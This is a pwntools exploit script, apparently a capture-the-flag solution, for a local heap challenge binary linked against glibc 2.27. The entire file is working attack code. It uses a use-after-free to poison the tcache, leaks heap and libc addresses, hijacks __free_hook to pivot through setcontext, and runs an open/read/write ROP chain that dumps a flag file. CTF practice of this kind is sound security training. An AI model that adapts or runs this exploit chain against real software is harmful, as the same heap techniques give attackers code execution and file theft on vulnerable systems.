#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
# gdb.attach(p)
# pause()

p = process('./UAF27-16')
libc = ELF('./libc-2.27-1.6.so')
elf = ELF('./UAF27-16')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

add(0x40) #0 0x250
add(0x40) #1 0x2a0

#0x2f0 0x370 0x3f0 0x470 0x4f0 0x570 0x5f0 
for i in range(7): 
	add(0x70) #2-8

#填满tcachebin
for i in [1,0,1,0,1,0,1]:
	delete(i)
	edit(i, p64(0))

delete(0) #放入 fastbin

show(1)
heapbase = u64(p.recv(16)[-8:].ljust(8, "\x00")) - 0x10
pr('heapbase',heapbase)

edit(1, p64(heapbase+0x250))
add(0x40) #9 use chunk0
add(0x40) #10 tcachebin分配去 chunk0-0x10
edit(10, p64(0)+p64(0x421)) #修改chunk0 size = 0x421

add(0x10) #11 防止合并
delete(0) #unsortedbin

show(0)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0
pr('libcbase',libcbase)
setcontext_door = libcbase + libc.sym['setcontext'] + 53
free_hook = libcbase + libc.sym['__free_hook']
bss_addr = libcbase + libc.bss()
syscall_ret = libcbase + 0xd2625 # syscall ; ret
prdx_ret = libcbase + 0x130514 # pop rdx ; pop r10 ; ret
prdi_ret = libcbase + 0x2164f  # pop rdi ; ret
prsi_ret = libcbase + 0x23a6a  # pop rsi ; ret
prax_ret = libcbase + 0x1b500  # pop rax ; ret
ret = prdi_ret + 1 # ret

flag_addr = heapbase + 0x380

payload  = p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)
#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)
#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

#分割unsortedbin
add(0x68) #12 0x250
add(0x68) #13 0x2c0
add(0x10) #14 0x330

delete(12) #tcachebin
edit(12, p64(free_hook))
add(0x68) #15 use chunk12
add(0x68) #16
edit(16, p64(setcontext_door))

edit(12, payload[:0x68])
edit(13, payload[0x68:])

edit(3, './flag\x00\x00'.ljust(0x60,'\x00')+p64(heapbase+0x260)+p64(ret))
#gdb.attach(p)
#pause()

delete(14)
p.interactive()
